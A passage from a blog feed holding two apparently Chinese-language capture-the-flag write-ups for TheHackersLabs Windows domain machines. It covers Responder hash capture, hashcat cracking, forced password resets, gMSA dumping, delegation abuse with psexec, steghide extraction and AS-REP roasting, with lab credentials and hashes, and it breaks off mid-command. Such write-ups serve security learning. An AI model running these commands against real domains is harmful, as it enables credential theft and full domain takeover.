Microsoft Windows Active Directory LDAP (Domain: hackme.thl, Site: Default-First-Site-Name)\n| ssl-cert: Subject: commonName=DC.hackme.thl\n| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.hackme.thl\n| Not valid before: 2024-10-16T13:11:58\n|_Not valid after:  2025-10-16T13:11:58\n|_ssl-date: 2025-07-19T05:31:22+00:00; 0s from scanner time.\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49670/tcp open  msrpc         Microsoft Windows RPC\n49672/tcp open  msrpc         Microsoft Windows RPC\n49683/tcp open  msrpc         Microsoft Windows RPC\n49695/tcp open  msrpc         Microsoft Windows RPC\n49703/tcp open  msrpc         Microsoft Windows RPC\n49704/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:94:AB:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-07-19T05:31:14\n|_  start_date: 2025-07-19T11:20:37\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:94:ab:82 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.50 ms 192.168.56.8\n```\n\n### 枚举测试\n\n因为没有 `Web` 端口，我们从  `SMB` 服务开始枚举\n\n测试匿名账户\n\n```bash\n➜  Curiosity smbclient -L 192.168.56.8 -U anonymous\nPassword for [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n```\n\n在这里尝试枚举了很久，没结果\n\n### responder\n\n打开 `Wireshark` 抓包看看\n\n看到`LLMNR`，让我想起了`NTLM`中继攻击\n\n![image.png](/post-images/TheHackersLabsCuriosity/image1.png)\n\n打开 `responder` \n\n```bash\nresponder -I eth2\n```\n\n抓到 `jdoe` 的 `NET-NTLM hash`\n\n![image.png](/post-images/TheHackersLabsCuriosity/image2.png)\n\n使用 `hashcat` 进行爆破\n\n```bash\nhashcat -m 5600 hash /usr/share/seclists/Passwords/seasons.txt \n```\n\n得到密码`$pr1ng@`\n\n![image.png](/post-images/TheHackersLabsCuriosity/image3.png)\n\n测试凭据\n\n```bash\n➜  Curiosity nxc smb hackme.thl -u jdoe -p '$pr1ng@'                                                         \nSMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.8    445    DC               [+] hackme.thl\\jdoe:$pr1ng@ \n➜  Curiosity nxc ldap hackme.thl -u jdoe -p '$pr1ng@'\nLDAP        192.168.56.8    389    DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:hackme.thl)\nLDAP        192.168.56.8    389    DC               [+] hackme.thl\\jdoe:$pr1ng@ \n➜  Curiosity nxc winrm hackme.thl -u jdoe -p '$pr1ng@'\nWINRM       192.168.56.8    5985   DC               [*] Windows 10 / Server 2016 Build 14393 (name:DC) (domain:hackme.thl)\n/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.\n  arc4 = algorithms.ARC4(self._key)\nWINRM       192.168.56.8    5985   DC               [+] hackme.thl\\jdoe:$pr1ng@ (Pwn3d!)\n```\n\n当前用户可以拿到 `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\jdoe\\Desktop> cat user.txt\n{bdxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## 域分析\n\n收集数据\n\n```bash\n➜  Curiosity bloodhound-python -d 'hackme.thl' -ns 192.168.56.8 --zip -c All -dc 'DC.hackme.thl' -u jdoe -p '$pr1ng@'\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: hackme.thl\nINFO: Getting TGT for user\nINFO: Connecting to LDAP server: DC.hackme.thl\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC.hackme.thl\nINFO: Found 17 users\nINFO: Found 67 groups\nINFO: Found 2 gpos\nINFO: Found 6 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: DC.hackme.thl\nINFO: Connecting to GC LDAP server: DC.hackme.thl\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250719140452_bloodhound.zip\n```\n\n上 `BLoodhound`\n\n用户组信息\n\n![image.png](/post-images/TheHackersLabsCuriosity/image4.png)\n\n`jdoe` 用户信息\n\n![image.png](/post-images/TheHackersLabsCuriosity/image5.png)\n\n拥有强制修改`DBA_ADM` 的权限\n\n![image.png](/post-images/TheHackersLabsCuriosity/image6.png)\n\n## 横向移动\n\n### To DBA_ADM\n\n通过 `bloodyAD` 来修改其密码，失败了 ❌\n\n![image.png](/post-images/TheHackersLabsCuriosity/image7.png)\n\n我们远程上去通过 `PowerShell` 改 \n\n```bash\n$SecPassword = ConvertTo-SecureString '$pr1ng@' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('HACKME\\jdoe', $SecPassword)\n$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n. ./PowerView.ps1\nSet-DomainUserPassword -Identity DBA_ADM -AccountPassword $UserPassword -Credential $Cred\n```\n\n测试凭据\n\n![image.png](/post-images/TheHackersLabsCuriosity/image8.png)\n\n### To sqlsvc\n\n![image.png](/post-images/TheHackersLabsCuriosity/image9.png)\n\n```bash\n*Evil-WinRM* PS C:\\Users> ls\n\n    Directory: C:\\Users\n\nMode                LastWriteTime         Length Name\n----                -------------         ------ ----\nd-----       10/18/2024   8:34 AM                Administrator\nd-----       10/17/2024   4:53 PM                dba_adm\nd-----       10/17/2024   2:56 PM                jdoe\nd-----       10/17/2024   7:49 PM                MSSQL$SQLEXPRESS\nd-r---        9/12/2016   1:37 PM                Public\nd-----       10/18/2024   5:46 PM                sqlsvc\nd-----       10/17/2024   7:49 PM                SQLTELEMETRY$SQLEXPRESS\n```\n\n`winpeas` 枚举时能看到数据库的管道\n\n![image.png](/post-images/TheHackersLabsCuriosity/image10.png)\n\n我们的用户应该是可以和数据库进行交互的\n\n```bash\n*Evil-WinRM* PS C:\\> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"SELECT @@VERSION\"\n\n--------------------------------------------------------------\nMicrosoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)\n        Sep 24 2019 13:48:23\n        Copyright (C) 2019 Microsoft Corporation\n        Express Edition (64-bit) on Windows Server 2016 Datacenter 10.0 <X64> (Build 14393: ) (Hypervisor)\n\n(1 rows affected)\n```\n\n```bash\n*Evil-WinRM* PS C:\\> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"select name FROM sys.databases\"\nname\n-------------------------------------------------------------------------------------------\ntempdb\nmodel\nmsdb\nCredentialsDB\n\n(5 rows affected)\n```\n\n```bash\n*Evil-WinRM* PS C:\\> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE CredentialsDB;select name from  sys.tables\"\nChanged database context to 'CredentialsDB'.\nname\n--------------------------------------------------------------------------------------------------------------------------------\nCredentials\n\n(1 rows affected)\n```\n\n```bash\n*Evil-WinRM* PS C:\\> sqlcmd -S \"localhost\\SQLEXPRESS\" -Q \"USE CredentialsDB;select * from Credentials\"\nChanged database context to 'CredentialsDB'.\nID          Username                                           Password\n----------- -------------------------------------------------- ---------------------------------------------\n          1 sqlsvc                                             23012244084524e51305f015727b890b\n\n(1 rows affected)\n```\n\n这样就读到了`sqlsvc`用户的密码\n\n到在线网站进行破解，得到密码 `P@ssword1234!`\n\n![image.png](/post-images/TheHackersLabsCuriosity/image11.png)\n\n测试凭据\n\n```bash\n➜  Curiosity nxc smb hackme.thl -u sqlsvc -p 'P@ssword1234!'\nSMB         192.168.56.8    445    DC               [*] Windows 10 / Server 2016 Build 14393 x64 (name:DC) (domain:hackme.thl) (signing:True) (SMBv1:False) \nSMB         192.168.56.8    445    DC               [+] hackme.thl\\sqlsvc:P@ssword1234! \n```\n\n### To GMSA_SVC$\n\n`SQLSVC` 账户可以读取 `GMAS` 密码\n\n![image.png](/post-images/TheHackersLabsCuriosity/image12.png)\n\n读取 `gMSA` 的密码\n\n```bash\n➜  gMSADumper python gMSADumper.py -u sqlsvc -p 'P@ssword1234!' -d hackme.thl\nUsers or groups who can read password for GMSA_SVC$:\n > GMSA_USERS\nGMSA_SVC$:::e1eef5023c307890fdbb047e6554cfd0\nGMSA_SVC$:aes256-cts-hmac-sha1-96:b6ec5a8b9a8b6053167b86b1ef724f3af27c3de4286a59a6bfcb293a37740b66\nGMSA_SVC$:aes128-cts-hmac-sha1-96:a6dc7233da4a2d54e340bb0131d9d921\n```\n\n### To Administrator\n\n我们寻找路径，发现`GMSA_SVC$` 对 `DC` 有 `AllowToAct` 权限\n\n![image.png](/post-images/TheHackersLabsCuriosity/image13.png)\n\n`AllowToAct` 就是 `AllowedToActOnBehalfOfOtherIdentity` ，`GMSA_SVC` 已添加到 `DC.HACKME.THL` 上的 `msds-AllowedToActOnBehalfOfOtherIdentity` 属性中\n\n```bash\n➜  Curiosity getST.py -spn 'cifs/DC.hackme.thl' -impersonate 'administrator' 'hackme.thl/GMSA_SVC$' -hashes :e1eef5023c307890fdbb047e6554cfd0\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[-] CCache file is not found. Skipping...\n[*] Getting TGT for user\n[*] Impersonating administrator\n[*] Requesting S4U2Proxy\n[*] Saving ticket in administrator@cifs_DC.hackme.thl@HACKME.THL.ccache\n```\n\n```bash\n➜  Curiosity export KRB5CCNAME=administrator@cifs_DC.hackme.thl@HACKME.THL.ccache \n\n➜  Curiosity psexec.py administrator@dc.hackme.thl -k -no-pass\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Requesting shares on dc.hackme.thl.....\n[*] Found writable share ADMIN$\n[*] Uploading file vgKATdFu.exe\n[*] Opening SVCManager on dc.hackme.thl.....\n[*] Creating service VDYV on dc.hackme.thl.....\n[*] Starting service VDYV.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.14393]\n(c) 2016 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32> \n```\n\n读取 `root.txt`\n\n```bash\nC:\\Users\\Administrator\\Desktop> type root.txt\n24axxxxxxxxxxxxxxxxxxxxxxxxx\n```\n\n## 总结\n\n不算难，除了爆破的字典有点不明所以\n\n最后一步，直接看 `GMSA_SVC$` 的 `OutBound Execution`是空的，但自己寻找路径又能找到就有点奇怪\n\n下面的脚本为什么我们可以截取到 `jdoe` 用户的`NET NTLM HASH`\n\n```bash\n*Evil-WinRM* PS C:\\temp> cat shareconnect.ps1\n\nwhile ($true) {\n    # Comando net use para reconectar el recurso compartido\n    net use Z: \\\\SQLserver\\bbdd /user:hackme\\jdoe '$pr1ng@'\n\n    # Espera de 1 minuto antes de volver a ejecutar\n    Start-Sleep -Seconds 60\n}\n```",
            "url": "https://www.sunsetaction.top/2025/07/19/TheHackersLabsCuriosity",
            "title": "TheHackersLabs - Curiosity",
            "summary": "Curiosity https://labs.thehackerslabs.com/machine/23 Recon PortScan nmap 端口扫描 UDP 也扫描 枚举测试 因为没有 Web 端口，我们从 SMB 服务开始枚举 测试匿名账户 在这里尝试枚举了很久，没结果 responder ...",
            "date_modified": "2025-07-19T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "靶机",
                "TheHackersLabs",
                "Windows",
                "AD",
                "Responder",
                "MSSQL",
                "gMSA"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/18/TheHackersLabsB I G",
            "content_html": "\n# B.I.G\n\n> https://labs.thehackerslabs.com/machine/6\n> \n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image.png)\n\n## Recon\n\n### Port scan\n\n使用 `nmap` 对端口进行扫描\n\n```bash\n➜  BIG nmap -sT -min-rate 10000 -p- 192.168.212.4\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 15:47 CST\nWarning: 192.168.212.4 giving up on port because retransmission cap hit (10).\nStrange read error from 192.168.212.4 (104 - 'Connection reset by peer')\nNmap scan report for 192.168.212.4\nHost is up (0.00037s latency).\nNot shown: 64855 closed tcp ports (conn-refused), 655 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n53/tcp    open  domain\n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds\n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP\n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n47001/tcp open  winrm\n49664/tcp open  unknown\n49665/tcp open  unknown\n49666/tcp open  unknown\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49671/tcp open  unknown\n49673/tcp open  unknown\n49676/tcp open  unknown\n49686/tcp open  unknown\nMAC Address: 08:00:27:FA:B6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 26.20 seconds\n```\n\n```bash\n➜  BIG nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.212.4\nPORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n80/tcp    open  http          Microsoft IIS httpd 10.0\n| http-methods:\n|_  Potentially risky methods: TRACE\n|_http-title: Site doesn't have a title (text/html).\n|_http-server-header: Microsoft-IIS/10.0\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-18 23:51:41Z)\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active D➜  BIG smbclient -L 192.168.212.4 -U anonymous                                 \nPassword for [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bbr.thl, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n9389/tcp  open  mc-nmf        .NET Message Framing\n47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\n49664/tcp open  msrpc         Microsoft Windows RPC\n49665/tcp open  msrpc         Microsoft Windows RPC\n49666/tcp open  msrpc         Microsoft Windows RPC\n49667/tcp open  msrpc         Microsoft Windows RPC\n49669/tcp open  msrpc         Microsoft Windows RPC\n49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n49671/tcp open  msrpc         Microsoft Windows RPC\n49673/tcp open  msrpc         Microsoft Windows RPC\n49676/tcp open  msrpc         Microsoft Windows RPC\n49686/tcp open  msrpc         Microsoft Windows RPC\nMAC Address: 08:00:27:FA:B6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2016|2019\nOS CPE: cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2019\nOS details: Microsoft Windows Server 2016 or Server 2019\nNetwork Distance: 1 hop\nService Info: Host: BIG; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-07-18T23:52:36\n|_  start_date: 2025-07-18T23:44:01\n|_nbstat: NetBIOS name: BIG, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:fa:b6:62 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n|_clock-skew: 15h59m55s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.53 ms 192.168.212.4\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 83.13 seconds\n```\n\n### 枚举测试\n\n`SMB` 匿名账户测试\n\n```bash\n➜  BIG smbclient -L 192.168.212.4 -U anonymous                                 \nPassword for [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILURE\n```\n\n## WEB\n\n### 目录扫描\n\n`HTTP` 服务\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image1.png)\n\n> 两段歌词的来源\n> \n> \n> ### **I keep it music music, I eat that lunch (Yeah)**\n> \n> - **来源:** 这句歌词出自 **Travis Scott** 2023年专辑《UTOPIA》中的大热单曲 **《FE!N》**，是客串的歌手 **Playboi Carti** 的部分。\n> - **含义解析:** 这句歌词是典型的Playboi Carti风格，用极简但充满态度的语言来表达自己的状态。\n>     - **`I keep it music music`**: 这句话的意思是“我的世界里只有音乐，我一直专注于音乐”。他用重复的“music music”来强调自己完全沉浸在创作和音乐的氛围中，这是他生活的核心和全部重心。这是一种对自己艺术家身份的强调。\n>     - **`I eat that lunch`**: 这是一句非常形象的俚语，意思是**“我轻松搞定一切”、“我把竞争对手都干掉了”**。想象一下，吃午餐是一件多么轻松日常的事情。他用这个比喻来表示他在说唱游戏（Rap Game）中游刃有余，把击败对手、取得成功看得像吃午饭一样简单。这是一种极度自信和傲慢的炫耀（Bragging）。\n> \n> ---\n> \n> ### **It was all a dream**\n> \n> **它是一个文化符号，是嘻哈历史上最经典、最标志性的开场白之一。**\n> \n> - **来源:** 这句歌词出自传奇说唱歌手 **The Notorious B.I.G. (又名 Biggie Smalls)** 在1994年发布的歌曲 **《Juicy》**。这首歌是他的首张专辑《Ready to Die》中的主打单曲，也是他的成名作。\n> - **原文和背景:** 完整的开场是：\n>     \n>     \"It was all a dream, I used to read Word Up! magazine\n>     Salt-n-Pepa and Heavy D up in the limousine\"\n>     \n\n---\n\n对网站目录爆破\n\n```bash\n➜  BIG feroxbuster --url http://192.168.212.4 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt --filter-status 404,503,400 -x php,zip,txt\n                                                                                                    \n ___  ___  __   __     __      __         __   ___\n|__  |__  |__) |__) | /  `    /  \\ \\_/ | |  \\ |__\n|    |___ |  \\ |  \\ | \\__,    \\__/ / \\ | |__/ |___\nby Ben \"epi\" Risher 🤓                 ver: 2.11.0\n───────────────────────────┬──────────────────────\n 🎯  Target Url            │ http://192.168.212.4\n 🚀  Threads               │ 50\n 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt\n 💢  Status Code Filters   │ [404, 503, 400]\n 💥  Timeout (secs)        │ 7\n 🦡  User-Agent            │ feroxbuster/2.11.0\n 💉  Config File           │ /etc/feroxbuster/ferox-config.toml\n 🔎  Extract Links         │ true\n 💲  Extensions            │ [php, zip, txt]\n 🏁  HTTP methods          │ [GET]\n 🔃  Recursion Depth       │ 4\n───────────────────────────┴──────────────────────\n 🏁  Press [ENTER] to use the Scan Management Menu™\n──────────────────────────────────────────────────\n404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter\n301      GET        2l       10w      151c http://192.168.212.4/images => http://192.168.212.4/images/\n200      GET       21l       41w      435c http://192.168.212.4/\n301      GET        2l       10w      153c http://192.168.212.4/contents => http://192.168.212.4/contents/\n[>-------------------] - 5s     48285/2491564 5m      found:3       errors:0      \n301      GET        2l       10w      150c http://192.168.212.4/songs => http://192.168.212.4/songs/\n200      GET        5l       22w      112c http://192.168.212.4/contents/notify.txt\n200      GET       74l      667w     3350c http://192.168.212.4/songs/juicy.txt\n200      GET      396l     2780w   362382c http://192.168.212.4/images/big4.jpg\n200      GET      396l     2780w   362232c http://192.168.212.4/images/big2.jpg\n[####################] - 8m   3322088/3322088 0s      found:6       errors:0      \n[####################] - 8m    830516/830516  1683/s  http://192.168.212.4/ \n[####################] - 8m    830516/830516  1676/s  http://192.168.212.4/images/ \n[####################] - 8m    830516/830516  1676/s  http://192.168.212.4/contents/ \n[####################] - 8m    830516/830516  1684/s  http://192.168.212.4/songs/\n```\n\n`Skyisthelimit.txt` 还是一个字典\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image2.png)\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image3.png)\n\n### 图片隐写\n\n这一部分看了一下 write-up\n\n`notify.txt` \n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image4.png)\n\n> *“你到底雇了哪个该死的家伙来做这个网站！”\n“又把密钥用 MD5 藏起来！”\n“我要炒了那个家伙”*\n> \n\n那么密码可能是 `music` 的 `MD5` 值\n\n```bash\n➜  BIG echo -n \"music\" | md5sum                                                 \n18d6769919266cd0bd6cd78aa405d5d0  -\n```\n\n那么要在哪里使用密码？藏起来感觉是`MISC`了\n\n我们将 `images/big.jpg` 图片下载下来，使用 `steghide` 来导出数据\n\n```bash\n➜  BIG steghide extract -sf big1.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big2.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big4.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n```\n\n但是密码不对，主页中还有几段歌词，我们尝试一下\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image5.png)\n\n```bash\n➜  BIG echo -n \"I keep it music music\" | md5sum\na6002952ffda89154a38a248280093d2  -\n➜  BIG echo -n \"I eat that lunch (Yeah)\" | md5sum\nd2b5f22e80f680d9660a1d3ab81232fd  -\n➜  BIG echo -n \"It was all a dream\" | md5sum\n99ae77c0c0faf78b872f9f452e3eaa24  -\n```\n\n能得到一个文件 `frase.txt` ，使用 MD5 `99ae77c0c0faf78b872f9f452e3eaa24`\n\n```bash\n➜  BIG steghide extract -sf big2.jpg            \nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big2.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big2.jpg\nEnter passphrase: \nwrote extracted data to \"frase.txt\".\n➜  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big3.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big4.jpg  \nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big4.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n➜  BIG steghide extract -sf big4.jpg\nEnter passphrase: \nsteghide: could not extract any data with that passphrase!\n```\n\n里边是个密码\n\n```bash\n➜  BIG cat frase.txt           \nBigpoppa1972\n```\n\n> 声名狼藉先生（The Notorious B.I.G.，1972年5月21日——1997年3月9日）\n> \n\n### 枚举用户名\n\n有了密码，但是不知道的用在哪\n\n根据前面得到的信息，`music` 或者 `Juice`也可能是用户名\n\n```bash\nWho the hell did you hire to create the website!\nHiding keys in MD5 again!\nI'm going to fire that guy\n\nmusic\n```\n\n测试凭据\n\n```bash\n➜  ~ nxc smb 192.168.212.4 -u music -p Bigpoppa1972                    \nSMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False) \nSMB         192.168.212.4   445    BIG              [+] bbr.thl\\music:Bigpoppa1972 \n\n➜  ~ nxc wmi 192.168.212.4 -u music -p Bigpoppa1972\nRPC         192.168.212.4   135    BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)\nRPC         192.168.212.4   135    BIG              [+] bbr.thl\\music:Bigpoppa1972 \n\n➜  ~ nxc ldap 192.168.212.4 -u music -p Bigpoppa1972\nLDAP        192.168.212.4   389    BIG              [*] Windows 10 / Server 2016 Build 14393 (name:BIG) (domain:bbr.thl)\nLDAP        192.168.212.4   389    BIG              [+] bbr.thl\\music:Bigpoppa1972 \n```\n\n远程登录，进去是`TEMP`用户\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image6.png)\n\n当前目录下可以拿到 `user.txt`\n\n```bash\n*Evil-WinRM* PS C:\\Users\\music\\Documents> type user.txt\n53bxxxxxxxxxxxxxxxxxxx\n```\n\n## 域分析\n\n收集信息\n\n```bash\n➜  ~ bloodhound-python -d 'bbr.thl' -ns 192.168.212.4 --zip -c All -dc 'BIG.bbr.thl' -u music -p Bigpoppa1972\nINFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)\nINFO: Found AD domain: bbr.thl\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)\nINFO: Connecting to LDAP server: BIG.bbr.thl\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: BIG.bbr.thl\nINFO: Found 7 users\nINFO: Found 57 groups\nINFO: Found 2 gpos\nINFO: Found 1 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: BIG.bbr.thl\nINFO: Done in 00M 01S\nINFO: Compressing output into 20250718165617_bloodhound.zip\n```\n\n用户组信息\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image7.png)\n\n很明显，目标用户是`SONG`\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image8.png)\n\n通过 `BLoodhound` 可以看到可以用 `AS-REP` 来打\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image9.png)\n\n## **AS_REP Roasting**\n\n```bash\n➜BIG GetNPUsers.py -dc-ip 192.168.212.4 bbr.thl/ -usersfile users\n  import pkg_resources\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies\n  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)\n$krb5asrep$23$song@BBR.THL:6d769bdfb04e89789dae27e05b47a393$cde1b6fd59270bc8bfd31470ea4d007ac3fe3750ad8d54b6ec2a63e75495569286eb887787747eeb57c690dfacfb3c913823b0c539ce23ddba0fdbc6bacae8f19530\ncb25f73664a3feafd432ee89e6b56fd6ace082c511a5041b79ef1c8c836b8b3636dca11ed49ff2c372cbf0dd06b184a2575656d41440d7c16e58e8262c3c5a30627c467f84e4dcc83ee19e235bd6168c8abd780d6927f7315a1e16b46cf6570e\nba13b09664cd2cac4a2478c4e67e75d5335a7b61260f79d553d76e96b24ea282d78977e449b130c405a4c2de4c42930f958c8616debbce85dde09896ba30b352\n```\n\n使用 `hashcat` 破解，使用上面的的字典\n\n```bash\n➜  BIG hashcat -m 18200 hash Skyisthelimit.txt\n```\n\n得到密码 `Passwordsave@`\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image10.png)\n\n测试凭据\n\n```bash\n➜  BIG nxc smb 192.168.212.4 -u song -p Passwordsave@ \nSMB         192.168.212.4   445    BIG              [*] Windows 10 / Server 2016 Build 14393 x64 (name:BIG) (domain:bbr.thl) (signing:True) (SMBv1:False) \nSMB         192.168.212.4   445    BIG              [+] bbr.thl\\song:Passwordsave@ \n```\n\n## 权限提升\n\n寻找利用链，重新获取一下数据\n\n```bash\nbloodhound-python -d 'bbr.thl' -ns 192.168.212.4 --zip -c All -dc 'BIG.bbr.thl' -u song -p Passwordsave@\n```\n\n### 链子 1 ❌\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image11.png)\n\n将 `Song` 添加 `SPECIAL PERMISSIONS` \n\n```bash\n$SecPassword = ConvertTo-SecureString 'Passwordsave@' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('bbr\\song', $SecPassword)\nAdd-DomainGroupMember -Identity 'SPECIAL PERMISSIONS' -Members 'song' -Credential $Cred\n```\n\n![image.png](/post-images/TheHackersLabsB%20I%20G/image12.png)\n\n`DACL` 滥用，赋予自己拥有`users`的所有权限\n\n```bash\n➜  BIG bloodyAD 